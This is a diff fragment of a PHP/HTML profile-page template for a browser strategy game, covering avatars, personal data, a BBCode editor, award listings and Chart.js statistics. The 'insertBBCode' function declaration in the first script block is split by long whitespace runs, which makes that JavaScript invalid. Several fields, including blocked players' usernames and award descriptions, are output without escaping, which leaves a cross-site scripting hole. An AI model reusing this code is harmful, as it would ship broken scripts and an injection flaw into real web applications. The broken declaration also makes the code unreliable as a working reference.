+                                                                style="vertical-align: middle; margin-right: 5px; width: 20px; height: 20px;">
+                                                            <span style="color: #8c5f0d; font-weight: bold;">Carregar imagem
+                                                                própria requer Conta
+                                                                Premium</span>
+                                                        </div>-->
+
+                                                        <!-- Avatar Selection Gallery -->
+                                                        <strong><?= __('screens.profile.or_choose_avatar') ?></strong>
+                                                        <div
+                                                            style="margin-top: 10px; max-height: 350px; overflow-y: auto; border: 1px solid #8c5f0d; padding: 5px; background: #f0e6c2;">
+                                                            <div
+                                                                style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px;">
+                                                                <?php for ($i = 1; $i <= 31; $i++): ?>
+                                                                    <label style="cursor: pointer; display: block;">
+                                                                        <input type="radio" name="avatar" value="<?= $i ?>"
+                                                                            <?= (isset($user['avatar']) && $user['avatar'] == $i) ? 'checked' : '' ?> style="display: none;">
+                                                                        <img src="graphic/player/profile/<?= $i ?>.webp"
+                                                                            class="avatar-option"
+                                                                            style="width: 80px; height: 80px; border: 3px solid #8c5f0d; display: block; transition: border-color 0.2s;"
+                                                                            onclick="this.previousElementSibling.checked = true; document.querySelectorAll('.avatar-option').forEach(img => img.style.borderColor = '#8c5f0d'); this.style.borderColor = '#d4af37';">
+                                                                    </label>
+                                                                <?php endfor; ?>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                    <!-- Extended Profile Fields -->
+                                                    <div
+                                                        style="background: #c1a264; padding: 8px; font-weight: bold; color: #000;">
+                                                        <?= __('screens.profile.personal_data') ?>
+                                                    </div>
+                                                    <div style="padding: 10px;">
+                                                        <table width="100%">
+                                                            <tr>
+                                                                <td width="120"><?= __('screens.profile.birth_date') ?></td>
+                                                                <td>
+                                                                    <input type="text" name="b_day" size="2" maxlength="2"
+                                                                        value="<?= isset($user['b_day']) && $user['b_day'] > 0 ? $user['b_day'] : '' ?>">
+                                                                    <select name="b_month">
+                                                                        <option value="0"><?= __('screens.profile.month') ?>
+                                                                        </option>
+                                                                        <?php
+                                                                        $months = [1 => __('screens.profile.january'), 2 => __('screens.profile.february'), 3 => __('screens.profile.march'), 4 => __('screens.profile.april'), 5 => __('screens.profile.may'), 6 => __('screens.profile.june'), 7 => __('screens.profile.july'), 8 => __('screens.profile.august'), 9 => __('screens.profile.september'), 10 => __('screens.profile.october'), 11 => __('screens.profile.november'), 12 => __('screens.profile.december')];
+                                                                        foreach ($months as $num => $name): ?>
+                                                                            <option value="<?= $num ?>"
+                                                                                <?= (isset($user['b_month']) && $user['b_month'] == $num) ? 'selected' : '' ?>>
+                                                                                <?= $name ?>
+                                                                            </option>
+                                                                        <?php endforeach; ?>
+                                                                    </select>
+                                                                    <input type="text" name="b_year" size="4" maxlength="4"
+                                                                        value="<?= isset($user['b_year']) && $user['b_year'] > 0 ? $user['b_year'] : '' ?>">
+                                                                </td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td><?= __('screens.profile.gender') ?></td>
+                                                                <td>
+                                                                    <label><input type="radio" name="sex" value="f"
+                                                                            <?= (isset($user['sex']) && $user['sex'] == 'f') ? 'checked' : '' ?>>
+                                                                        <?= __('screens.profile.female') ?></label>
+                                                                    <label><input type="radio" name="sex" value="m"
+                                                                            <?= (!isset($user['sex']) || $user['sex'] == 'm') ? 'checked' : '' ?>>
+                                                                        <?= __('screens.profile.male') ?></label>
+                                                                    <label><input type="radio" name="sex" value="n"
+                                                                            <?= (isset($user['sex']) && $user['sex'] == 'n') ? 'checked' : '' ?>>
+                                                                        <?= __('screens.profile.not_specified') ?></label>
+                                                                </td>
+                                                            </tr>
+                                                            <tr>
+                                                                <td><?= __('screens.profile.location') ?></td>
+                                                                <td>
+                                                                    <input type="text" name="ort"
+                                                                        value="<?= htmlspecialchars($user['ort'] ?? '') ?>"
+                                                                        style="width: 200px;">
+                                                                </td>
+                                                            </tr>
+                                                        </table>
+                                                    </div>
+
+                                                    <!-- Texto Pessoal Section -->
+                                                    <div
+                                                        style="background: #c1a264; padding: 8px; font-weight: bold; color: #000;">
+                                                        <?= __('screens.profile.personal_text') ?>
+                                                    </div>
+                                                    <div style="padding: 10px;">
+                                                        <!-- BBCode Toolbar -->
+                                                        <?php 
+                                                        $textareaId = 'personal_text';
+                                                        $prefix = 'prof_';
+                                                        include __DIR__ . '/../components/bbcode_toolbar.php'; 
+                                                        ?>
+
+                                                        <!-- Textarea -->
+                                                        <textarea id="personal_text" name="personal_text" rows="10"
+                                                            style="width: 100%; border: 1px solid #8c5f0d; background-color: #fffdf0; font-family: monospace; padding: 5px;"><?= htmlspecialchars($user['personal_text'] ?? '') ?></textarea>
+
+                                                        <!-- Buttons -->
+                                                        <div style="margin-top: 10px;">
+                                                            <input type="submit" name="save_profile"
+                                                                value="<?= __('screens.profile.save') ?>" class="btn"
+                                                                style="padding: 4px 12px;">
+                                                            <input type="button"
+                                                                value="<?= __('screens.profile.preview') ?>" class="btn"
+                                                                style="padding: 4px 12px; margin-left: 5px;"
+                                                                onclick="alert('<?= __('screens.profile.preview_coming_soon') ?>')">
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                            </div>
+
+
+                                            <!-- Metas de crescimento (Regular) -->
+                                            <?php if (($config['awards'] ?? true) && !empty($awards_regular)): ?>
+                                                <div class="award-group">
+                                                    <div class="award-group-head"><?= __('screens.profile.medals_acquired') ?>
+                                                    </div>
+                                                    <div class="award-group-content">
+                                                        <?php
+                                                        $has_shown_awards = false;
+                                                        foreach ($awards_regular as $index => $award):
+                                                            // Only show unlocked awards in the summary tab
+                                                            if ($award['level'] <= 0)
+                                                                continue;
+                                                            $has_shown_awards = true;
+                                                            ?>
+                                                            <div class="award-box clearfix">
+                                                                <div class="award <?= htmlspecialchars($award['class'] ?? '') ?>">
+                                                                    <img src="graphic/awards/<?= htmlspecialchars($award['image']) ?>.png"
+                                                                        title="" alt="">
+                                                                </div>
+                                                                <div class="award-desc">
+                                                                    <strong><?= htmlspecialchars($award['name']) ?>
+                                                                        (<?= htmlspecialchars($award['level_label']) ?> -
+                                                                        <?= __('screens.common.level') ?>
+                                                                        <?= htmlspecialchars($award['level']) ?>)</strong>
+                                                                    <p><?= $award['description'] ?></p>
+                                                                </div>
+                                                            </div>
+                                                            <?php if ($index < count($awards_regular) - 1): ?>
+                                                                <hr>
+                                                            <?php endif; ?>
+                                                        <?php endforeach; ?>
+
+                                                        <?php if (!$has_shown_awards): ?>
+                                                            <div style="padding: 10px; font-style: italic;">
+                                                                <?= __('screens.profile.no_medals_yet') ?>
+                                                            </div>
+                                                        <?php endif; ?>
+                                                    </div>
+                                                    <div class="award-group-foot">&nbsp;</div>
+                                                </div>
+                                                <br>
+                                            <?php endif; ?>
+
+                                            <!-- Medalhas Diárias -->
+                                            <?php if (($config['awards'] ?? true) && !empty($awards_daily)): ?>
+                                                <div class="award-group">
+                                                    <div class="award-group-head"><?= __('screens.profile.daily_medals') ?>
+                                                    </div>
+                                                    <div class="award-group-content">
+                                                        <?php foreach ($awards_daily as $index => $award): ?>
+                                                            <div class="award-box clearfix">
+                                                                <div class="award <?= htmlspecialchars($award['class'] ?? '') ?>">
+                                                                    <img src="graphic/awards/<?= htmlspecialchars($award['image']) ?>.png"
+                                                                        title="" alt="">
+                                                                </div>
+                                                                <div class="award-desc">
+                                                                    <strong><?= htmlspecialchars($award['count']) ?>x
+                                                                        <?= htmlspecialchars($award['name']) ?></strong>
+                                                                    <p><?= $award['description'] ?></p>
+                                                                </div>
+                                                            </div>
+                                                            <?php if ($index < count($awards_daily) - 1): ?>
+                                                                <hr>
+                                                            <?php endif; ?>
+                                                        <?php endforeach; ?>
+                                                    </div>
+                                                    <div class="award-group-foot">&nbsp;</div>
+                                                </div>
+                                                <br>
+                                            <?php endif; ?>
+
+                                            <!-- Metas noutros mundos -->
+                                            <?php if (!empty($awards_other_worlds)): ?>
+                                                <div class="award-group">
+                                                    <div class="award-group-head">
+                                                        <?= __('screens.profile.goals_other_worlds') ?>
+                                                    </div>
+                                                    <div class="award-group-content" style="padding: 10px;">
+                                                        <?php foreach ($awards_other_worlds as $world_data): ?>
+                                                            <div style="margin-bottom: 5px;">
+                                                                <strong><?= __('screens.profile.world') ?>
+                                                                    <?= htmlspecialchars($world_data['world']) ?></strong>
+                                                            </div>
+                                                            <div><?= $world_data['icons_html'] ?></div>
+                                                            <div style="margin-bottom: 10px;"></div>
+                                                        <?php endforeach; ?>
+                                                    </div>
+                                                    <div class="award-group-foot">&nbsp;</div>
+                                                </div>
+                                            <?php endif; ?>
+
+                                        </td>
+                                    </tr>
+                                </table>
+
+                                <script>
+                                                                                                   functi                                                                                                                                                 on inser                                                                                            tBBCode(tag) {
+                                        const textarea = document.getElementById('personal_text');
+                                        const start = textarea.selectionStart;
+                                        const end = textarea.selectionEnd;
+                                        const text = textarea.value;
+                                        const selectedText = text.substring(start, end);
+
+                                        let before, after;
+
+                                        switch (tag) {
+                                            case 'url':
+                                                before = '[url=]';
+                                                after = '[/url]';
+                                                break;
+                                            case 'img':
+                                                before = '[img]';
+                                                after = '[/img]';
+                                                break;
+                                            case 'player':
+                                                before = '[player]';
+                                                after = '[/player]';
+                                                break;
+                                            case 'tribe':
+                                                before = '[ally]';
+                                                after = '[/ally]';
+                                                break;
+                                            case 'size':
+                                                before = '[size=12]';
+                                                after = '[/size]';
+                                                break;
+                                            case 'color':
+                                                before = '[color=#000000]';
+                                                after = '[/color]';
+                                                break;
+                                            default:
+                                                before = '[' + tag + ']';
+                                                after = '[/' + tag + ']';
+                                        }
+
+                                        textarea.value = text.substring(0, start) + before + selectedText + after + text.substring(end);
+                                        textarea.focus();
+                                        textarea.selectionStart = start + before.length;
+                                        textarea.selectionEnd = start + before.length + selectedText.length;
+                                    }
+
+                                    // Highlight selected avatar on page load
+                                    document.addEventListener('DOMContentLoaded', function () {
+                                        const selectedAvatar = document.querySelector('input[name="avatar"]:checked');
+                                        if (selectedAvatar) {
+                                            const img = selectedAvatar.nextElementSibling;
+                                            if (img) img.style.borderColor = '#d4af37';
+                                        }
+                                    });
+                                </script>
+
+                            </div>
+                        <?php elseif ($current_tab === 'inventory'): ?>
+                            <?php require __DIR__ . '/inventory.php'; ?>
+
+                        <?php elseif ($current_tab === 'stats'): ?>
+                            <!-- Chart.js CDN -->
+                            <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+
+                            <style>
+                                .stats-grid {
+                                    display: grid;
+                                    grid-template-columns: repeat(3, 1fr);
+                                    gap: 10px;
+                                    margin: 10px 0;
+                                }
+
+                                .stat-chart-box {
+                                    background: #f4e4bc;
+                                    border: 1px solid #7d510f;
+                                }
+
+                                .stat-chart-header {
+                                    background: #c1a264;
+                                    padding: 4px 8px;
+                                    font-weight: bold;
+                                    color: #fff;
+                                    border-bottom: 1px solid #7d510f;
+                                    display: flex;
+                                    align-items: center;
+                                    gap: 5px;
+                                }
+
+                                .stat-chart-content {
+                                    padding: 10px;
+                                    background: #f4e4bc;
+                                    position: relative;
+                                    height: 250px;
+                                }
+
+                                .chart-canvas {
+                                    width: 100% !important;
+                                    height: 100% !important;
+                                }
+                            </style>
+
+                            <?php if (!empty($stats['charts']['points']['data'])): ?>
+                                <div class="stats-grid">
+                                    <!-- Pontos do jogador -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/overview/main.png" width="16" height="16">
+                                            <?= __('screens.profile.player_points') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="pointsChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+
+                                    <!-- Aldeias do jogador -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/buildings/place.png" width="16" height="16">
+                                            <?= __('screens.profile.player_villages') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="villagesChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+
+                                    <!-- Classificação do jogador -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/overview/main.png" width="16" height="16">
+                                            <?= __('screens.profile.player_ranking') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="rankChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+
+                                    <!-- Pontos da tribo -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/overview/main.png" width="16" height="16">
+                                            <?= __('screens.profile.tribe_points') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <?php if ($stats['charts']['tribe_points']): ?>
+                                                <canvas id="tribePointsChart" class="chart-canvas"></canvas>
+                                            <?php else: ?>
+                                                <div
+                                                    style="display: flex; align-items: center; justify-content: center; height: 100%; color: #999;">
+                                                    <div style="text-align: center;">
+                                                        <div style="font-size: 32px; margin-bottom: 10px;">📊</div>
+                                                        <div><?= ($user['ally'] > 0) ? __('screens.profile.waiting_for_data') : __('screens.profile.no_tribe') ?></div>
+                                                    </div>
+                                                </div>
+                                            <?php endif; ?>
+                                        </div>
+                                    </div>
+
+                                    <!-- Aldeias saqueadas -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/buildings/place.png" width="16" height="16">
+                                            <?= __('screens.profile.looted_villages') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="villagesLootedChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+
+                                    <!-- Recursos pilhados -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/res.png" width="16" height="16">
+                                            <?= __('screens.profile.looted_resources') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="resourcesLootedChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+
+                                    <!-- Unidades derrotadas -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/unit/unit_spear.png" width="16" height="16">
+                                            <?= __('screens.profile.defeated_units') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="combatChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+
+                                    <!-- Unidades ganhas / perdidas -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/unit/unit_spear.png" width="16" height="16">
+                                            <?= __('screens.profile.units_won_lost') ?>
+                                        </div>
+                                        <div class="stat-chart-content"
+                                            style="display: flex; align-items: center; justify-content: center; color: #999;">
+                                            <div style="text-align: center;">
+                                                <div style="font-size: 32px; margin-bottom: 10px;">📊</div>
+                                                <div><?= __('screens.profile.coming_soon_placeholder') ?></div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- Recursos gastos -->
+                                    <div class="stat-chart-box">
+                                        <div class="stat-chart-header">
+                                            <img src="graphic/res.png" width="16" height="16">
+                                            <?= __('screens.profile.resources_spent') ?>
+                                        </div>
+                                        <div class="stat-chart-content">
+                                            <canvas id="resourcesChart" class="chart-canvas"></canvas>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <script>
+                                    // Chart.js default config
+                                    Chart.defaults.font.size = 10;
+                                    Chart.defaults.color = '#000';
+
+                                    const chartOptions = {
+                                        responsive: true,
+                                        maintainAspectRatio: false,
+                                        plugins: {
+                                            legend: { display: false },
+                                            tooltip: {
+                                                backgroundColor: 'rgba(0, 0, 0, 0.8)',
+                                                padding: 8,
+                                                titleFont: { size: 11 },
+                                                bodyFont: { size: 10 }
+                                            }
+                                        },
+                                        scales: {
+                                            x: {
+                                                grid: { display: false },
+                                                ticks: {
+                                                    font: { size: 9 },
+                                                    maxRotation: 0,
+                                                    minRotation: 0
+                                                }
+                                            },
+                                            y: {
+                                                beginAtZero: false,
+                                                grid: {
+                                                    color: 'rgba(0, 0, 0, 0.05)',
+                                                    drawBorder: false
+                                                },
+                                                ticks: {
+                                                    precision: 0,
+                                                    callback: function (value) {
+                                                        if (value >= 1000) return (value / 1000) + 'k';
+                                                        return value;
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    };
+
+                                    // Simple point charts
+                                    const pointCharts = ['points', 'villages', 'rank', 'tribePoints', 'villagesLooted', 'resourcesLooted'];
+                                    pointCharts.forEach(type => {
+                                        const ctx = document.getElementById(type + 'Chart');
+                                        if (!ctx) return;
+
+                                        const data = <?= json_encode($stats['charts']) ?>[
+                                            type === 'tribePoints' ? 'tribe_points' :
+                                                type === 'villagesLooted' ? 'villages_looted' :
+                                                    type === 'resourcesLooted' ? 'resources_looted' :
+                                                        type
+                                        ];
+
+                                        if (!data || !data.labels || data.labels.length === 0) {
+                                            const container = ctx.parentElement;
+                                            container.innerHTML = '<div style="display:flex; align-items:center; justify-content:center; height:100%; color:#999; font-size:10px;"><?= __("screens.profile.waiting_for_data") ?></div>';
+                                            return;
+                                        }
+
+                                        new Chart(ctx, {
+                                            type: 'line',
+                                            data: {
+                                                labels: data.labels,
+                                                datasets: [{
+                                                    data: data.data,
+                                                    borderColor: type.includes('tribe') ? '#000080' : '#008000',
+                                                    backgroundColor: type.includes('tribe') ? 'rgba(0, 0, 128, 0.1)' : 'rgba(0, 128, 0, 0.1)',
+                                                    borderWidth: 2,
+                                                    pointRadius: 3,
+                                                    pointHoverRadius: 5,
+                                                    fill: true,
+                                                    tension: 0.1
+                                                }]
+                                            },
+                                            options: {
+                                                ...chartOptions,
+                                                scales: {
+                                                    ...chartOptions.scales,
+                                                    y: {
+                                                        ...chartOptions.scales.y,
+                                                        reverse: (type === 'rank'),
+                                                        beginAtZero: (type !== 'rank' && type !== 'points')
+                                                    }
+                                                }
+                                            }
+                                        });
+                                    });
+
+                                    // Detailed charts
+                                    const detailedCharts = ['combat', 'resources'];
+                                    detailedCharts.forEach(type => {
+                                        const ctx = document.getElementById(type + 'Chart');
+                                        if (!ctx) return;
+
+                                        const data = <?= json_encode($stats['charts']) ?>[type];
+                                        if (!data.datasets || data.datasets.length === 0 || !data.labels || data.labels.length === 0) {
+                                            const container = ctx.parentElement;
+                                            container.innerHTML = '<div style="display:flex; align-items:center; justify-content:center; height:100%; color:#999; font-size:10px;"><?= __("screens.profile.waiting_for_data") ?></div>';
+                                            return;
+                                        }
+
+                                        new Chart(ctx, {
+                                            type: 'bar',
+                                            data: {
+                                                labels: data.labels,
+                                                datasets: data.datasets.map(ds => ({
+                                                    ...ds,
+                                                    borderWidth: 1
+                                                }))
+                                            },
+                                            options: {
+                                                ...chartOptions,
+                                                plugins: {
+                                                    ...chartOptions.plugins,
+                                                    legend: { display: true, position: 'bottom', labels: { boxWidth: 10, font: { size: 8 } } }
+                                                },
+                                                scales: {
+                                                    ...chartOptions.scales,
+                                                    x: { ...chartOptions.scales.x, stacked: true },
+                                                    y: { ...chartOptions.scales.y, stacked: true }
+                                                }
+                                            }
+                                        });
+                                    });
+                                </script>
+                            <?php else: ?>
+                                <div style="text-align: center; padding: 60px 20px; color: #999;">
+                                    <div style="font-size: 64px; margin-bottom: 20px;">📊</div>
+                                    <h3><?= __('screens.profile.stats_no_data') ?></h3>
+                                    <p><?= __('screens.profile.stats_no_data_desc') ?></p>
+                                </div>
+                            <?php endif; ?>
+
+                        <?php elseif ($current_tab === 'friends'): ?>
+                            <?php require __DIR__ . '/friends.php'; ?>
+
+                        <?php elseif ($current_tab === 'bonus'): ?>
+                            <?php require __DIR__ . '/profile_bonus.php'; ?>
+
+                        <?php elseif ($current_tab === 'mentor'): ?>
+                            <h3><?= __('screens.profile.mentor_title') ?></h3>
+                            <div class="info-box">
+                                <?= __('screens.profile.mentorship') ?>
+                                (<?= __('screens.profile.coming_soon_placeholder') ?>)
+                            </div>
+
+                        <?php elseif ($current_tab === 'block'): ?>
+                            <h3><?= __('screens.profile.block_title') ?></h3>
+                            <p class="description"><?= __('screens.profile.block_description') ?></p>
+                            <?php if (empty($blocked)): ?>
+                                <div class="info-box"><?= __('screens.profile.no_blocked_players') ?></div>
+                            <?php else: ?>
+                                <table class="vis" style="width:100%">
+                                    <tr>
+                                        <th><?= __('screens.profile.name') ?></th>
+                                        <th><?= __('screens.profile.actions') ?></th>
+                                    </tr>
+                                    <?php foreach ($blocked as $buser): ?>
+                                        <tr>
+                                            <td><?php echo $buser['username']; ?></td>
+                                            <td><a href="#"><?= __('screens.profile.unblock') ?></a></td>
+                                        </tr>
+                                    <?php endforeach; ?>
+                                </table>
+                            <?php endif; ?>
+
+                        <?php elseif ($current_tab === 'awards'): ?>
+                            <!-- Awards Detail Tab -->
+                            <div
+                                style="background-color: #fceec4; padding: 10px; border: 1px solid #c1a264; margin-top: 5px;">
+
+                                <!-- Daily Awards Section -->
+                                <?php if (!empty($awards_daily)): ?>
+                                    <div class="award-group">
+                                        <div class="award-group-head"><?= __('screens.profile.daily_goals') ?></div>
+                                        <div class="award-group-content">
+                                            <?php foreach ($awards_daily as $index => $award): ?>
+                                                <div class="award-box clearfix" style="position: relative; min-height: 80px;">
+                                                    <div class="award level4" style="float: left; margin-right: 10px;">
+                                                        <img src="graphic/awards/<?= htmlspecialchars($award['image']) ?>.png"
+                                                            title="" alt="">
+                                                    </div>
+                                                    <div class="award-desc" style="overflow: hidden;">
+                                                        <strong><?= htmlspecialchars($award['count']) ?>x
+                                                            <?= htmlspecialchars($award['name']) ?></strong>
+                                                        <p style="margin: 5px 0;"><?= $award['description'] ?></p>
+                                                        <div style="color: #7b5212; font-size: 10px;">
+                                                            <?= __('screens.profile.coming_soon_placeholder') ?>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <?php if ($index < count($awards_daily) - 1): ?>
+                                                    <hr style="margin: 10px 0; border: 0; border-top: 1px dotted #8c5f0d;">
+                                                <?php endif; ?>
+                                            <?php endforeach; ?>
+                                        </div>
+                                        <div class="award-group-foot">&nbsp;</div>
+                                    </div>
+                                    <br>
+                                <?php endif; ?>
+
+                                <!-- Regular Awards Section with Progress -->
+                                <div class="award-group">
+                                    <div class="award-group-head"><?= __('screens.profile.growth_goals') ?></div>
+                                    <div class="award-group-content">
+                                        <?php if (empty($awards_regular)): ?>
+                                            <div style="padding: 10px;"><?= __('screens.profile.no_growth_awards') ?></div>
+                                        <?php else: ?>
+                                            <?php foreach ($awards_regular as $index => $award): ?>
+                                                <div class="award-box clearfix" style="padding: 5px 0;">
+                                                    <!-- Icon -->
+                                                    <div class="award <?= htmlspecialchars($award['class'] ?? '') ?>"
+                                                        style="float: left; margin-right: 15px;">
+                                                        <img src="graphic/awards/<?= htmlspecialchars($award['image']) ?>.png"
+                                                            title="" alt="">
+                                                    </div>
+
+                                                    <!-- Info & Progress -->
+                                                    <div class="award-desc" style="overflow: hidden;">
+                                                        <strong><?= htmlspecialchars($award['name']) ?>
+                                                            (<?= htmlspecialchars($award['level_label']) ?> -
+                                                            <?= __('screens.common.level') ?>
+                                                            <?= htmlspecialchars($award['level']) ?>)</strong>
+                                                        <p style="margin: 5px 0;"><?= $award['description'] ?></p>
+
+                                                        <?php if (!$award['is_maxed'] && $award['next_value'] > 0): ?>
+                                                            <div
+                                                                style="margin-top: 5px; background-color: #f7eed3; border: 1px solid #7d510f; padding: 5px;">
+                                                                <div style="font-size: 10px; color: #5d2f09; margin-bottom: 2px;">
+                                                                    <?= __('screens.common.next_level') ?>:
+                                                                    <?= $award['next_desc'] ?? __('screens.profile.keep_playing') ?>
+                                                                </div>
+
+                                                                <!-- Progress Bar Container -->
+                                                                <div
+                                                                    style="width: 100%; background-color: #ded1ad; height: 12px; border: 1px solid #7d510f; position: relative;">
+                                                                    <!-- Progress Bar Fill -->
+                                                                    <div
+                                                                        style="width: <?= $award['progress_percent'] ?>%; background-color: #5d2f09; height: 100%; max-width: 100%;">
+                                                                    </div>
+                                                                    <!-- Text Overlay -->
+                                                                    <div
+                                                                        style="position: absolute; top: -1px; width: 100%; text-align: center; color: #fff; font-size: 9px; font-weight: bold; text-shadow: 1px 1px 1px #000;">
+                                                                        <?= format_number($award['current_value']) ?> /
+                                                                        <?= format_number($award['next_value']) ?>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        <?php elseif ($award['is_maxed']): ?>
+                                                            <div style="margin-top: 5px; color: #155724; font-weight: bold;">
+                                                                <?= __('screens.profile.completed') ?>
+                                                            </div>
+                                                        <?php endif; ?>
+                                                    </div>
+                                                </div>
+                                                <?php if ($index < count($awards_regular) - 1): ?>
+                                                    <hr style="margin: 10px 0; border: 0; border-top: 1px dotted #8c5f0d;">
+                                                <?php endif; ?>
+                                            <?php endforeach; ?>
+                                        <?php endif; ?>
+                                    </div>
+                                    <div class="award-group-foot">&nbsp;</div>
+                                </div>
+
+                                <!-- Awards from Other Active Worlds -->
+                                <?php if (!empty($awards_active_worlds) && ($user['show_active_worlds'] ?? 0)): ?>
+                                    <div class="award-group">
+                                        <div class="award-group-head"><?= __('screens.profile.goals_other_worlds') ?></div>
+                                        <div class="award-group-content">
+                                            <?php foreach ($awards_active_worlds as $world_data): ?>
+                                                <div
+                                                    style="margin-bottom: 15px; padding: 10px; background-color: #f7eed3; border: 1px solid #7d510f;">
+                                                    <div style="margin-bottom: 8px;">
+                                                        <strong
+                                                            style="color: #5d2f09;"><?= htmlspecialchars($world_data['world_name']) ?></strong>
+                                                        <span
+                                                            style="font-size: 10px; color: #666; margin-left: 10px;"><?= __('screens.profile.player_label') ?>
+                                                            <?= htmlspecialchars($world_data['player_name']) ?></span>
+                                                    </div>
+                                                    <?php if (!empty($world_data['awards'])): ?>
+                                                        <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+                                                            <?php foreach ($world_data['awards'] as $award): ?>
+                                                                <?php if ($award['level'] > 0): ?>
+                                                                    <div class="award <?= htmlspecialchars($award['class'] ?? '') ?>"
+                                                                        title="<?= htmlspecialchars($award['name']) ?> - <?= __('screens.common.level') ?> <?= $award['level'] ?>">
+                                                                        <img src="graphic/awards/<?= htmlspecialchars($award['image']) ?>.png"
+                                                                            alt="">
+                                                                    </div>
+                                                                <?php endif; ?>
+                                                            <?php endforeach; ?>
+                                                        </div>
+                                                    <?php else: ?>
+                                                        <div style="font-style: italic; color: #666; font-size: 11px;">
+                                                            <?= __('screens.profile.no_medal_in_world') ?>
+                                                        </div>
+                                                    <?php endif; ?>
+                                                </div>
+                                            <?php endforeach; ?>
+                                        </div>
+                                        <div class="award-group-foot">&nbsp;</div>
+                                    </div>
+                                    <br>
+                                <?php endif; ?>
+
+                                <!-- Awards from Closed Worlds -->
+                                <?php if (!empty($awards_closed_worlds) && ($user['show_closed_worlds'] ?? 0)): ?>
+                                    <div class="award-group">
+                                        <div class="award-group-head"><?= __('screens.profile.goals_closed_worlds') ?></div>
+                                        <div class="award-group-content">
+                                            <?php foreach ($awards_closed_worlds as $world_data): ?>
+                                                <div
+                                                    style="margin-bottom: 15px; padding: 10px; background-color: #f7eed3; border: 1px solid #7d510f;">
+                                                    <div style="margin-bottom: 8px;">
+                                                        <strong
+                                                            style="color: #5d2f09;"><?= htmlspecialchars($world_data['world_name']) ?></strong>
+                                                        <span
+                                                            style="font-size: 10px; color: #666; margin-left: 10px;"><?= __('screens.profile.player_label') ?>
+                                                            <?= htmlspecialchars($world_data['player_name']) ?></span>
+                                                        <?php if (!empty($world_data['final_rank'])): ?>
+                                                            <span
+                                                                style="font-size: 10px; color: #666; margin-left: 10px;"><?= __('screens.profile.final_rank_label') ?>
+                                                                #<?= number_format($world_data['final_rank']) ?></span>
+                                                        <?php endif; ?>
+                                                    </div>
+                                                    <?php if (!empty($world_data['awards'])): ?>
+                                                        <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+                                                            <?php foreach ($world_data['awards'] as $award): ?>
+                                                                <?php if ($award['level'] > 0): ?>
+                                                                    <div class="award <?= htmlspecialchars($award['class'] ?? '') ?>"
+                                                                        title="<?= htmlspecialchars($award['name']) ?> - <?= __('screens.common.level') ?> <?= $award['level'] ?>">
+                                                                        <img src="graphic/awards/<?= htmlspecialchars($award['image']) ?>.png"
+                                                                            alt="">
+                                                                    </div>
+                                                                <?php endif; ?>
+                                                            <?php endforeach; ?>
+                                                        </div>
+                                                    <?php else: ?>
+                                                        <div style="font-style: italic; color: #666; font-size: 11px;">
+                                                            <?= __('screens.profile.no_medal_in_world') ?>
+                                                        </div>
+                                                    <?php endif; ?>
+                                                </div>
+                                            <?php endforeach; ?>
+                                        </div>
+                                        <div class="award-group-foot">&nbsp;</div>
+                                    </div>
+                                    <br>
+                                <?php endif; ?>
+
+                                <br>
+
+                                <!-- Public Settings Filter --><?php if ($current_tab === 'awards'): ?>
+                                    <form method="POST"
+                                        action="game.php?village=<?= $village['id'] ?>&screen=profile&mode=awards&h=<?= $hkey ?>">
+                                        <div
+                                            style="background-color: #f0e6c2; border: 1px solid #7d510f; padding: 10px; margin-top: 10px;">
+                                            <strong><?= __('screens.profile.public_settings') ?></strong>
+                                            <div style="margin-top: 5px;">
+                                                <label>
+                                                    <input type="checkbox" name="hide_own_awards" <?= $user['hide_own_awards'] ? 'checked' : '' ?>>
+                                                    <?= __('screens.profile.hide_own_awards_label') ?>
+                                                </label>
+                                            </div>
+                                            <div style="margin-top: 5px;">
+                                                <label>
+                                                    <input type="checkbox" name="show_active_worlds"
+                                                        <?= ($user['show_active_worlds'] ?? 0) ? 'checked' : '' ?>>
+                                                    <?= __('screens.profile.show_active_worlds_label') ?>
+                                                </label>
+                                            </div>
+                                            <div style="margin-top: 5px;">
+                                                <label>
+                                                    <input type="checkbox" name="show_closed_worlds"
+                                                        <?= ($user['show_closed_worlds'] ?? 0) ? 'checked' : '' ?>>
+                                                    <?= __('screens.profile.show_closed_worlds_label') ?>
+                                                </label>
+                                            </div>
+                                            <div style="margin-top: 10px;">
